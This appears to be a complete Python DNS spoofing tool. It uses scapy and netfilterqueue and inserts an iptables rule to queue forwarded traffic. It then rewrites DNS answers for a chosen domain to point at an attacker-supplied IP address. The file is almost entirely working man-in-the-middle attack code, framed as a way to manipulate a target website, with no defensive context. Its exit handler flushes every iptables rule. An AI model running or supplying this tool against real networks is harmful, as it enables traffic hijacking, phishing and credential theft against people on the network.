#!/usr/bin/env python 3.7.2
# -*- coding: utf-8 -*-
import sys
import os
from termcolor import colored
try:
	import scapy.all as scapy
except KeyboardInterrupt:
	print(colored("\n[-] CTRL+C was pressed. Please wait...", "red"))
	print(colored("[-] Exiting the application!", "red"))
	sys.exit()
import netfilterqueue
import argparse
import tldextract

class DNSSPOOF():
	def __init__(self):
		self.about()
		self.script_desc()
		self.url=""
		self.redirect=""
		self.ip_forward(1)
		self.url_extract()

	def arguman_al(self):
		parse=argparse.ArgumentParser(description=self.description,epilog=self.usage,prog=self.program)
		parse.add_argument("--u","--url",dest="url",help="URL to perform DNS spoofing on")
		parse.add_argument("--r","--redirect",dest="redirect",help="IP address to redirect to")
		options=parse.parse_args()
		if not options.url:
			parse.error('[-] Please specify a target URL, use --help for more information.')
		elif not options.redirect:
			parse.error("[-] Please specify the redirect address, use --help for more information.")
		else:
			return options

	def url_extract(self):
		options = self.arguman_al()
		self.url = tldextract.extract(options.url)
		self.url = ("{}.{}".format(self.url.domain, self.url.suffix))
		self.redirect = options.redirect

	def netfilterqueue(self):
		queue = netfilterqueue.NetfilterQueue()
		queue.bind(0, self.processPacket)
		queue.run()

	def processPacket(self, packet):
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname = (scapy_packet[scapy.DNSQR].qname).decode("utf-8")
			if self.url in qname:
				print("[+] Spoofing target >> " + colored(self.url, "green"))
				answer = scapy.DNSRR(rrname=qname, rdata=self.redirect)
				scapy_packet[scapy.DNS].an = answer
				scapy_packet[scapy.DNS].ancount = 1
				try:
					del scapy_packet[scapy.IP].len
					del scapy_packet[scapy.IP].chksum
					del scapy_packet[scapy.UDP].len
					del scapy_packet[scapy.UDP].chksum
				except IndexError:
					pass
				packet.set_payload(bytes(scapy_packet))
		packet.accept()

	def ip_forward(self, value):
		if value == 1:
			os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
		elif value == 2:
			os.system('iptables --flush')

	def script_desc(self):
		self.program = "dns_spoof"
		self.usage = "Usage: python dns_spoof.py --url www.example.com --redirect ip_address"
		self.description = "A script to manipulate the target website by redirecting DNS requests or traffic to a desired location."

	def about(self):
		print(colored("  _____  _   _  _____    _____                    __ ", "green"))
		print(colored(" |  __ \| \ | |/ ____|  / ____|                  / _|", "green"))
		print(colored(" | |  | |  \| | (___   | (___  _ __   ___   ___ | |_ ", "green"))
		print(colored(" | |  | | . ` |\___ \   \___ \| '_ \ / _ \ / _ \|  _|", "green"))
		print(colored(" | |__| | |\  |____) |  ____) | |_) | (_) | (_) | |  ", "green"))
		print(colored(" |_____/|_| \_|_____/  |_____/| .__/ \___/ \___/|_|  ", "green"))
		print(colored("                              | |                    ", "green"))
		print(colored("                              |_|                    ", "green"))
		print(colored("# ==============================================================================", "green"))
		print(colored("# BY       	    : ", "green") + "CBI")
		print(colored("# description 	: ", "green") + "A script to manipulate the target website by redirecting DNS requests or traffic to a desired location.")
		print(colored("# date        	: ", "green") + "22.05.2024")
		print(colored("# ==============================================================================", "green"))

try:
	dnsspoof = DNSSPOOF()
	dnsspoof.netfilterqueue()
except KeyboardInterrupt:
	dnsspoof.ip_forward(2)
	print(colored("\n[-] CTRL+C was pressed. Please wait...", "red"))
	print(colored("[-] Exiting the application!", "red"))
